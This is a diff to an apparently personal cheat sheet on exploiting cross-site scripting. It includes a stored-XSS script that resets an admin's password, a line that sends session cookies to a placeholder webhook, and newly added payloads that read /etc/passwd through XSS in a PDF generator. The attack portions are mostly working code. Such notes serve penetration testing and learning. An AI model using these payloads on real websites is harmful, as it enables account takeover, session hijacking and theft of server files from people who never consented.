@@ -8,7 +8,7 @@ Cross-Site scripting attacks.
 
 ## Couple basic stuff I usually do
 To find a vuln input, these are the steps I follow on every field, this may sometimes include headers like the *User-Agent* ...
-* Directly testing characters that might break things like {";'/\<>
+* Directly testing characters that might break things like {--!";'/\<>
 * Testing unescaped version of those characters through whatever proxy I use
 * Spamming XSS lists and checking if something goes wrong then finding which one worked 
 * Running tech specific payloads
@@ -39,13 +39,13 @@ Yeah, sometimes you just need to reset the admin's password to connect right? I 
 Got a stored XSS? good! You might need to add extra headers to match whatever is going on through 
 ```javascript
 <script>
-    var xhr = new XMLHttpRequest();    
-    xhr.open('POST', 'https://target/that-profile-page-I-need-to-exploit', true);
-    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-    xhr.send('newpassword=Password1234&repeated-newpassword=Password1234');
+    r = new XMLHttpRequest();    
+    r.open('POST', 'https://target/that-profile-page-I-need-to-exploit', true);
+    r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    r.send('newpassword=Password1234&repeated-newpassword=Password1234');
 </script>
 ```
-You might need to add extra headers with *xhr.setRequestHeader()* to match whatever is going on, but the skeleton is there.
+You might need to add extra headers with *r.setRequestHeader()* to match whatever is going on, but the skeleton is there.
 
 Oh the Whole CSRF thing? Yeah you're bypassing that if you're running it from the website itself. And if you aren't, you can always do a multistep request, i.e. get the CSRF-token by parsing the returned page from the first request and then run your password change and adding that value in the headers...
 
@@ -54,3 +54,25 @@ You could also send the session cookie to whatever [requestbin](http://requestbi
 document.write("<iframe src='https://your-webhook/'"+document.cookie+"></iframe>");
 ```
 Oh noes, security protocols have been bypassed!
+
+### Oh look a pdf that's generated with user input!
+Basic LFI by XSS in a PDF generator, used a variant a couple of times, fun times :D
+
+```javascript
+<script>
+	r = new XMLHttpRequest
+	r.onload=function(){
+		document.write(this.responseText)
+	}
+	r.open("GET","file:///etc/passwd")
+	r.send()
+</script>
+```
+You could also do
+```javascript
+<iframe src="file:///etc/passwd"></iframe>
+```
+Or even some
+```javascript
+<img src="this-file-doesnt-exist" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+```
